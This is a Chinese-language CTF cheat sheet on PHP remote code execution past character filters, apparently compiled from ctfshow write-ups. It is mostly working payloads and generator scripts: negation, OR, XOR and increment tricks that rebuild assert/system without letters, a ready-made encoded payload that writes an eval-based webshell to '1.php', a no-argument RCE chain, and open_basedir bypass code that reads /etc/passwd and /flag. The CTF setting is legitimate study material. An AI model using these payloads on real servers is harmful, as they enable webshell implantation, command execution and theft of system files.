## 无字母RCE

PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持，我们可以通过`('phpinfo')();`来执行函数

#### 取反

```
<?php
	$a ="phpinfo";
	$b ="";
	echo "(~";
	echo urlencode(~$a);
	print(")(~");
	echo urlencode(~$b);
	echo ");";
?>
```

#### 或

```python
import re  
  
content = ''  
preg = '[A-Za-z0-9]+'  # 题目过滤正则  
# 生成字典  
for i in range(256):  
    for j in range(256):  
        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):  
            k = i | j  
            if 32 <= k <= 126:  
                a = '%' + hex(i)[2:].zfill(2)  
                b = '%' + hex(j)[2:].zfill(2)  
                content += (chr(k) + ' ' + a + ' ' + b + '\n')  
f = open('rce_or.txt', 'w')  
f.write(content)  
  
while True:  
    payload1 = ''  
    payload2 = ''  
    code = input("data:")  
    for i in code:  
        f = open('rce_or.txt')  
        lines = f.readlines()  
        for line in lines:  
            if i == line[0]:  
                payload1 = payload1 + line[2:5]  
                payload2 = payload2 + line[6:9]  
                break  
    payload = '("' + payload1 + '"|"' + payload2 + '")'  
    print("payload: " + payload)
```

先输入system
再输入ls
payload为(xxxx)(xxxxx);（记得分号）

#### 自增

```
<?php
$_=[].'';   //得到"Array"
$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__ = $___;   //$__="A"
$_ = $___;   //$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$___ .= $__;   //$___="AS"
$___ .= $__;   //$___="ASS"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
$___ .= $__;   //$___="ASSE"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
$___ .= $__;   //$___="ASSER"
$__++;$__++;   //得到"T"，此时$__="T"
$___ .= $__;   //$___="ASSERT"
$__ = $_;   //$__="A"
$____ = "_";   //$____="_"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
$____ .= $__;   //$____="_P"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
$____ .= $__;   //$____="_PO"
$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$____ .= $__;   //$____="_POS"
$__++;   //得到"T"，此时$__="T"
$____ .= $__;   //$____="_POST"
$_ = $$____;   //$_=$_POST
$___($_[_]);   //ASSERT($POST[_])

$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

#### 异或

```
import re

content = ''
preg = '[A-Za-z0-9]+'  # 题目过滤正则
# 生成字典
for i in range(256):
    for j in range(256):
        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
            k = i ^ j
            if 32 <= k <= 126:
                a = '%' + hex(i)[2:].zfill(2)
                b = '%' + hex(j)[2:].zfill(2)
                content += (chr(k) + ' ' + a + ' ' + b + '\n')
f = open('rce_or.txt', 'w')
f.write(content)

def action(arg):
    s1=""
    s2=""
    for i in arg:
        f = open("rce_or.txt","r")
        while True:
            t=f.readline()
            if t=="":
                break
            if t[0]==i:
                #print(i)
                s1+=t[2:5]
                s2+=t[6:9]
                break
        f.close()
    output="(\""+s1+"\"^\""+s2+"\")"
    return(output)

while True:
    param=action(input("[+] your function：") )+action(input("[+] your command："))+";\n"
    print(param)
```

## 不允许动态执行时

```
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
 
answer = "phpinfo"
 
tmp1,tmp2 = '',''
for c in answer:
    for i in valid:
        for j in valid:
            if (ord(i)^ord(j) == ord(c)):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
print(tmp1,tmp2)

mess=0302181 @[@[_^^
```

## 现成的payload

```
mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);&_=phpinfo();
```

```
%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B'!'%3D%3D'%40'%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D'_'%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B
&_=file_put_contents('1.php','<?php @eval($_POST["shell"]); ?>')
```



## 无参数&&无字母RCE

```
二维数组进行拼接必须有[!%FF]进行分割

例如：
[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));
system(current(getallheaders()));
```







#### 临时文件或通配符

[ctfshow web入门 web41_ctfshow web41_yu22x的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/108569080)
[[CTFSHOW]命令执行_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169004083716800180635944%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=169004083716800180635944&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109837640-null-null.268^v1^koosearch&utm_term=ctfshow&spm=1018.2226.3001.4450)

[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

### 引用绕过

```
c=eval($_GET[a]);&a=system('cat flag.php');

当第一次传c时，c只是字符串，而eval之后变成了语句，则可传入a
```

### open_basedir绕过

**读取目录**

```
basckdoor=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```

[PHP绕过open_basedir列目录的研究 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)



**读取文件**

```php

软链接进行绕过
syslink(target,link) 对于已有的target建立一个名为link的符号连接
```

```php
mkdir("s");
chdir('s');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
echo file_get_contents("etc/passwd");

ini_set绕过
ini_set(varname,newvalue) 设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复
```



```
应用实例：_=file_put_contents('1.php',"<?php print_r(ini_get('open_basedir').'<br>'); mkdir('test'); chdir('test'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo file_get_contents('/flag'); print(1);?> ");
```



```
蚁剑连接
```

## glob伪协议

```
glob:// : 查找匹配的文件路径模式(支持正则表达式)

可用于查找爆破，因为glob支持正则，可以进行快速爆破
```



### disable_Function绕过

```
PHP-fpm绕过

Redis主从复制

蚁剑连接
```
